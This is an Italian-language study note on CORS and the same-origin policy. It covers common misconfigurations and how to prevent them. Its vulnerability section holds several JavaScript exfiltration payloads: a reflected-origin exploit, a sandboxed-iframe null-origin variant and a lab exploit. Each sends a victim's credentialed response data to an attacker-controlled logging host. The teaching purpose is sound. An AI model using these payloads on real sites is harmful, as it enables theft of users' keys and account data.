---
aliases: [CORS, Cross-origin resource sharing]
tags: [cyber-offence-and-defence]
---
La cross-origin resource sharing (CORS) è un meccanismo del browser che consente l'accesso controllato alle risorse situate al di fuori di un dato dominio. Estende e aggiunge flessibilità alla politica di origine (SOP). Tuttavia, fornisce anche il potenziale per attacchi tra domini, se la politica CORS di un sito web è configurata e implementata male. CORS non è una protezione contro attacchi tra origini come la falsificazione di richieste tra siti (CSRF).
## Same-origin policy (SOP)
La same-origin policy è un meccanismo di [[Sicurezza|sicurezza]] del browser web che mira a impedire ai siti web di attaccarsi a vicenda. La same-origin policy impedisce agli script su un'origine di accedere ai dati da un'altra origine. Un'origine è composta da uno schema URI, dominio e numero di porta. Ad esempio, considera il seguente URL:
`http://normal-website.com/example/example.html`

Questo utilizza lo schema `http`, il dominio `normal-website.com` e il numero di porta `80`. La seguente lista mostra come verrà applicata la politica della stessa origine se il contenuto all'URL sopra riportato tenta di accedere ad altre origini:
- `http://normal-website.com/example/` - Accesso consentito? Sì, stesso schema, dominio e porta;
- `http://normal-website.com/example2/` - Accesso consentito? Sì, stesso schema, dominio e porta;
- `https://normal-website.com/example/` - Accesso consentito? No, schema e porta diversi;
- `http://en.normal-website.com/example/` - Accesso consentito? No, dominio diverso;
- `http://www.normal-website.com/example/` - Accesso consentito? No, dominio diverso;
- `http://normal-website.com:8080/example/` - Accesso consentito? No, porta diversa (Internet Explorer consentirà questo accesso perché IE non tiene conto del numero di porta quando applica la politica della stessa origine).

**Perché è necessaria la same-origin policy?** Quando un browser invia una richiesta HTTP da un'origine a un'altra, tutti i cookie, inclusi i cookie di sessione di autenticazione, pertinenti all'altro dominio vengono inviati come parte della richiesta. Ciò significa che la risposta verrà generata all'interno della sessione dell'utente e includerà tutti i dati pertinenti specifici dell'utente. Senza la same-origin policy, se visitassi un sito web dannoso, questo sarebbe in grado di leggere le tue e-mail da GMail, i messaggi privati da Facebook, ecc.
## Allentamento della same-origin policy
La same-origin policy è molto restrittiva e di conseguenza sono stati ideati vari approcci per aggirare i vincoli. Molti siti web interagiscono con sottodomini o siti di terze parti in un modo che richiede un accesso cross-origin completo. Un allentamento controllato della same-origin policy è possibile utilizzando la cross-origin resource sharing (CORS).

Il protocollo di cross-origin resource sharing utilizza una serie di intestazioni HTTP che definiscono origini web attendibili e proprietà associate, ad esempio se è consentito l'accesso autenticato. Queste vengono combinate in uno scambio di intestazioni tra un browser e il sito web cross-origin a cui sta tentando di accedere.

Immaginiamo di voler accedere a un’API REST da un dominio diverso rispetto al nostro, con un’interazione front-end-to-backend. L’idea è che il nostro sito web (che ospita il front-end) richieda informazioni a un server che fornisce l’API REST. Questo server sarà il nostro backend.

Quando il front-end effettua una richiesta a un endpoint dell’API, il server risponde generalmente con un JSON contenente i dati richiesti. Tuttavia, quando il browser prova a leggere questa risposta JSON, potrebbe verificarsi un problema legato alla same-origin policy (SOP). Questa politica è una misura di [[Sicurezza|sicurezza]] che impedisce di accedere a risorse provenienti da domini diversi rispetto a quello del sito attuale. Se la richiesta è “cross-origin” (cioè proveniente da un dominio diverso), il browser potrebbe bloccare l’accesso alla risposta, rendendo il contenuto “opaco”. In pratica, sarà possibile accedere solo al codice di stato (es. 200 OK), ma non al contenuto della risposta.

Per superare questa restrizione in modo controllato, si utilizza il meccanismo CORS (Cross-Origin Resource Sharing). Il server, infatti, può configurare i suoi header per consentire richieste da domini specifici. Quando il browser effettua una richiesta cross-origin, aggiunge automaticamente un header chiamato `Origin`, che indica il dominio da cui proviene la richiesta (es. `example.com`). Il server, a sua volta, verifica se il dominio indicato è nella sua lista di domini consentiti (whitelist). Se lo è, il server include nella risposta un header chiamato `Access-Control-Allow-Origin` con il dominio approvato. Questo comunica al browser che può elaborare e rendere accessibile il contenuto della risposta. Se invece il dominio non è autorizzato, il server può decidere di non rispondere affatto o di inviare una risposta che il browser non potrà utilizzare. In questo modo, il server protegge le sue risorse da accessi non autorizzati.

Va notato che questo tipo di protezione è specifico per i browser. Se si utilizza un’applicazione desktop o mobile che non dipende dal browser (ad esempio, un’app Python che usa la libreria `requests`), l’header `Origin` non sarà incluso automaticamente. In questi casi, l’applicazione può impostare manualmente qualunque valore per l’header, rendendo il meccanismo di protezione meno efficace fuori dal contesto del browser.

Quindi, il meccanismo CORS è una protezione per gli utenti che accedono al web tramite browser, per evitare che le loro sessioni attive con un dominio possano essere utilizzate da siti non autorizzati. Tuttavia, non è pensato per proteggere l’API REST da accessi non autenticati al di fuori del browser.
## Errori frequenti su ACAC e ACAO
Un aspetto importante da considerare quando si lavora con le API e la [[Sicurezza|sicurezza]] delle richieste è l’header **Access-Control-Allow-Credentials**. Il suo unico valore possibile è `true`. Tuttavia, bisogna usarlo con cautela, perché aggiungerlo indiscriminatamente può abbassare il livello di protezione.

Questo header è rilevante solo se la richiesta include credenziali come cookie, intestazioni di autenticazione o altri dati sensibili. Se una richiesta non include queste credenziali, non è necessario aggiungere `Access-Control-Allow-Credentials: true` nella risposta. Infatti, in questi casi, l’endpoint è considerato pubblico, e i dati forniti non sono legati a un utente specifico.

**Quando utilizzare Access-Control-Allow-Credentials?** Se un endpoint richiede credenziali, come un cookie di sessione, il server deve includere questo header nella risposta per permettere al browser di elaborarla. Senza di esso, il browser bloccherà l’accesso alla risposta, anche se la richiesta è valida. Questo accade perché il server e il browser devono essere allineati nell’uso delle credenziali.

**Rischi nell’uso scorretto** Se si aggiunge questo header senza motivo, specialmente su endpoint che non richiedono autenticazione, si riduce il livello di [[Sicurezza|sicurezza]]. Ad esempio, un endpoint che riflette semplicemente qualsiasi valore ricevuto nell’header `Origin` è molto rischioso. Riflettere automaticamente l’origin significa consentire accessi da qualsiasi dominio, rendendo l’endpoint potenzialmente vulnerabile.

Una buona pratica è usare una lista di domini consentiti (allow list). Se l’API è destinata a essere utilizzata solo da domini specifici (es. `example.com`), il server dovrebbe controllare che l’header `Origin` corrisponda a uno di questi domini e rispondere di conseguenza.

Possono accadere situazioni particolari:
- **wild card `*` nell’header Access-Control-Allow-Origin:** questo indica che qualsiasi dominio può accedere all’endpoint. È utile per API pubbliche, come quelle di Google Maps, ma non è compatibile con `Access-Control-Allow-Credentials: true`. Questo perché non è possibile autorizzare credenziali da un dominio generico.
- **origine null:** l’origine `null` può verificarsi in contesti particolari, ad esempio quando si caricano risorse tramite schemi `data:` o da iframe con restrizioni di [[Sicurezza|sicurezza]]. In questi casi, l’origine non è definita, e la gestione deve essere fatta con attenzione per evitare problemi di [[Sicurezza|sicurezza]].

Alcuni consigli pratici per evitare gli errori comuni sono:
- usa `Access-Control-Allow-Credentials: true` solo se necessario, ovvero quando l’endpoint richiede credenziali;
- evita di riflettere automaticamente l’header `Origin`. Preferisci una lista di domini consentiti;
- per endpoint pubblici, considera l’uso della wild card `*` nell’header `Access-Control-Allow-Origin`, ma solo se non richiedi credenziali;
- controlla sempre che le configurazioni CORS siano coerenti con i requisiti di [[Sicurezza|sicurezza]] della tua applicazione.
## Vulnerabilità derivanti da problemi di configurazione CORS
Molti siti web moderni usano CORS per consentire l'accesso da sottodomini e terze parti fidate. La loro implementazione di CORS potrebbe contenere errori o essere eccessivamente indulgente per garantire che tutto funzioni, e questo può causare vulnerabilità sfruttabili.
### Intestazione ACAO generata dal server dall'intestazione Origin specificata dal client
Alcune applicazioni devono fornire l'accesso a un certo numero di altri domini. Mantenere un elenco di domini consentiti richiede uno sforzo continuo e qualsiasi errore rischia di compromettere la funzionalità. Quindi alcune applicazioni prendono la strada più facile, consentendo in modo efficace l'accesso da qualsiasi altro dominio.

Un modo per farlo è leggere l'intestazione `Origin` dalle richieste e includere un'intestazione di risposta che indica che l'origine richiedente è consentita. Ad esempio, considera un'applicazione che riceve la seguente richiesta:
```http
GET /sensitive-victim-data HTTP/1.1
Host: vulnerable-website.com
Origin: https://malicious-website.com
Cookie: sessionid=...
```
Quindi risponde con:
```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://malicious-website.com
Access-Control-Allow-Credentials: true
...
```
Queste intestazioni indicano che l'accesso è consentito dal dominio richiedente (`malicious-website.com`) e che le richieste cross-origin possono includere cookie (`Access-Control-Allow-Credentials: true`) e quindi saranno elaborate in sessione.

Poiché l'applicazione riflette origini arbitrarie nell'intestazione `Access-Control-Allow-Origin`, ciò significa che qualsiasi dominio può accedere alle risorse dal dominio vulnerabile. Se la risposta contiene informazioni sensibili come una chiave API o un token CSRF, è possibile recuperarle inserendo il seguente script sul sito web:
```javascript
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://vulnerable-website.com/sensitive-victim-data',true);
req.withCredentials = true;
req.send();
function reqListener() {
location='//malicious-website.com/log?key='+this.responseText;
};
```
### Errori durante l'analisi della intestazione Origin
Alcune applicazioni che supportano l'accesso da più origini lo fanno utilizzando una whitelist di origini consentite. Quando viene ricevuta una richiesta CORS, l'origine fornita viene confrontata con la whitelist. Se l'origine appare nella whitelist, viene riflessa nell'intestazione `Access-Control-Allow-Origin` in modo che l'accesso venga concesso. Ad esempio, l'applicazione riceve una richiesta normale come:
```http
GET /data HTTP/1.1
Host: normal-website.com
...
Origin: https://innocent-website.com
```
L'applicazione controlla l'origine fornita rispetto all'elenco delle origini consentite e, se presente nell'elenco, riflette l'origine come segue:
```http
HTTP/1.1 200 OK
...
Access-Control-Allow-Origin: https://innocent-website.com
```

Spesso si verificano errori quando si implementano le whitelist di origine CORS. Alcune organizzazioni decidono di consentire l'accesso da tutti i loro sottodomini (inclusi i futuri sottodomini non ancora esistenti). E alcune applicazioni consentono l'accesso da vari domini di altre organizzazioni, inclusi i loro sottodomini. Queste regole vengono spesso implementate abbinando prefissi o suffissi URL o utilizzando [[Espressioni regolari|espressioni regolari]]. Qualsiasi errore nell'implementazione può portare alla concessione dell'accesso a domini esterni non intenzionali.

Ad esempio, supponiamo che un'applicazione conceda l'accesso a tutti i domini che terminano con:
`normal-website.com`
Un aggressore potrebbe riuscire ad ottenere l'accesso registrando il dominio:
`hackersnormal-website.com`

In alternativa, supponiamo che un'applicazione conceda l'accesso a tutti i domini che iniziano con:
`normal-website.com`
Un aggressore potrebbe riuscire ad accedere utilizzando il dominio:
`normal-website.com.evil-user.net`
### Valore di origine null inserito nella whitelist
La specifica per l'intestazione `Origin` supporta il valore `null`. I browser potrebbero inviare il valore `null` nell'intestazione `Origin` in varie situazioni insolite:
- reindirizzamenti cross-origin;
- richieste da dati serializzati;
- richiesta tramite il protocollo `file:`;
- richieste cross-origin sandbox.

Alcune applicazioni potrebbero inserire nella whitelist l'origine `null` per supportare lo sviluppo locale dell'applicazione. Ad esempio, supponiamo che un'applicazione riceva la seguente richiesta cross-origin:
```http
GET /sensitive-victim-data
Host: vulnerable-website.com
Origin: null
```
E il server risponde con:
```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
```
In questa situazione, un aggressore può usare vari trucchi per generare una richiesta cross-origin contenente il valore `null` nell'intestazione `Origin`. Ciò soddisferà la whitelist, portando all'accesso cross-domain. Ad esempio, questo può essere fatto usando una richiesta cross-origin iframe sandbox del tipo:
```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" 
src="data:text/html,<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','vulnerable-website.com/sensitive-victim-data',true);
req.withCredentials = true;
req.send();
function reqListener() {
location='malicious-website.com/log?key='+this.responseText;
};
</script>"></iframe>
```

### Sfruttare XSS tramite relazioni di fiducia CORS
Anche CORS configurato "correttamente" stabilisce un rapporto di fiducia tra due origini. Se un sito web si fida di un'origine vulnerabile al cross-site scripting (XSS), un aggressore potrebbe sfruttare l'XSS per iniettare del codice [[JavaScript]] che usa CORS per recuperare informazioni sensibili dal sito che si fida dell'applicazione vulnerabile.

Data la seguente richiesta:
```http
GET /api/requestApiKey HTTP/1.1
Host: vulnerable-website.com
Origin: https://subdomain.vulnerable-website.com
Cookies: sessiond=...
```
Se il server risponde con:
```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://subdomain.vulnerable-website.com
Access-Control-Allow-Credentials: true
```
Quindi un aggressore che trova una vulnerabilità XSS su `subdomain.vulnerable-website.com` potrebbe usarla per recuperare la chiave API, usando un URL come:
`https://subdomain.vulnerable-website.com/?xss=<script>cors-stuff-here</script>`
### Interruzione di TLS con CORS mal configurato
Supponiamo che un'applicazione che impiega rigorosamente HTTPS inserisca nella whitelist anche un sottodominio attendibile che utilizza HTTP semplice. Ad esempio, quando l'applicazione riceve la seguente richiesta:
```http
GET /api/requestApiKey HTTP/1.1
Host: vulnerable-website.com
Origin: http://trusted-subdomain.vulnerable-website.com
Cookie: sessionid=...
```
L'applicazione risponde con:
```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: http://trusted-subdomain.vulnerable-website.com
Access-Control-Allow-Credentials: true
```
In questa situazione, un aggressore che è in grado di intercettare il traffico di un utente vittima può sfruttare la configurazione CORS per compromettere l'interazione della vittima con l'applicazione. Questo attacco comporta i seguenti passaggi:
- l'utente vittima effettua una richiesta HTTP semplice;
- l'aggressore inietta un reindirizzamento a: `http://trusted-subdomain.vulnerable-website.com`;
- il browser della vittima segue il reindirizzamento;
- l'aggressore intercetta la richiesta HTTP semplice e restituisce una risposta falsificata contenente una richiesta CORS a: `https://vulnerable-website.com`;
- il browser della vittima effettua la richiesta CORS, inclusa l'origine: `http://trusted-subdomain.vulnerable-website.com`;
- l’applicazione consente la richiesta perché questa è un'origine inserita nella whitelist. I dati sensibili richiesti vengono restituiti nella risposta;
- la pagina falsificata dell'aggressore può leggere i dati sensibili e trasmetterli a qualsiasi dominio sotto il controllo dell'aggressore.

Questo attacco è efficace anche se il sito web vulnerabile è altrimenti robusto nell'uso di HTTPS, senza endpoint HTTP e tutti i cookie contrassegnati come sicuri.
Ad esempio, un esempio di esecuzione dell’exploit è il seguente:
```javascript
<script>
 document.location="http://stock.0a5f00a50403b261814d1b51009400ae.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); 
req.onload = reqListener; 
req.open('get','https://0a5f00a50403b261814d1b51009400ae.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function 
reqListener() {location='https://exploit-0a86000a0418b21381971a700198001c.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
</script>
```
### Intranet e CORS senza credenziali
La maggior parte degli attacchi CORS si basa sulla presenza dell'intestazione di risposta:
`Access-Control-Allow-Credentials: true`
Senza tale intestazione, il browser dell'utente vittima rifiuterà di inviare i cookie, il che significa che l'aggressore otterrà accesso solo a contenuti non autenticati, a cui potrebbe accedere facilmente navigando direttamente sul sito web di destinazione.

Tuttavia, esiste una situazione comune in cui un aggressore non può accedere direttamente a un sito web: quando fa parte dell'intranet di un'organizzazione e si trova all'interno dello spazio di indirizzi IP privati. I siti web interni sono spesso tenuti a uno standard di [[Sicurezza|sicurezza]] inferiore rispetto ai siti esterni, consentendo agli aggressori di trovare vulnerabilità e ottenere ulteriore accesso. Ad esempio, una richiesta cross-origin all'interno di una rete privata potrebbe essere la seguente:
```http
GET /reader?url=doc1.pdf
Host: intranet.normal-website.com
Origin: https://normal-website.com
```
E il server risponde con:
```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: *
```
Il server applicativo si fida delle richieste di risorse da qualsiasi origine senza credenziali. Se gli utenti all'interno dello spazio di indirizzi IP privati accedono a Internet pubblico, è possibile eseguire un attacco basato su CORS dal sito esterno che utilizza il browser della vittima come proxy per accedere alle risorse intranet.
## Come prevenire gli attacchi basati su CORS
Le vulnerabilità CORS si presentano principalmente come configurazioni errate. La prevenzione è quindi un problema di configurazione. Alcune difese efficaci contro gli attacchi CORS sono:
- **configurazione corretta delle richieste cross-origin:** se una risorsa web contiene informazioni sensibili, l'origine deve essere specificata correttamente nell'intestazione `Access-Control-Allow-Origin`;
- **consenti solo siti attendibili:** può sembrare ovvio, ma le origini specificate nell'intestazione `Access-Control-Allow-Origin` devono essere solo siti attendibili. In particolare, riflettere dinamicamente le origini da richieste cross-origin senza convalida è facilmente sfruttabile e dovrebbe essere evitato;
- **evita di inserire nella whitelist null:** evita di utilizzare l'intestazione `Access-Control-Allow-Origin: null`. Le chiamate di risorse cross-origin da documenti interni e richieste sandbox possono specificare l'origine `null`. Le intestazioni CORS devono essere definite correttamente rispetto alle origini attendibili per server privati e pubblici;
- **evita i caratteri jolly nelle [[Reti|reti]] interne:** affidarsi alla sola configurazione di rete per proteggere le risorse interne non è sufficiente quando i browser interni possono accedere a domini esterni non attendibili;
- **CORS non sostituisce le policy di [[Sicurezza|sicurezza]] lato server:** CORS definisce i comportamenti del browser e non sostituisce mai la protezione lato server dei dati sensibili. Un aggressore può falsificare direttamente una richiesta da qualsiasi origine attendibile. Pertanto, i server web dovrebbero continuare ad applicare protezioni sui dati sensibili, come l'autenticazione e la gestione delle sessioni, oltre a CORS correttamente configurato.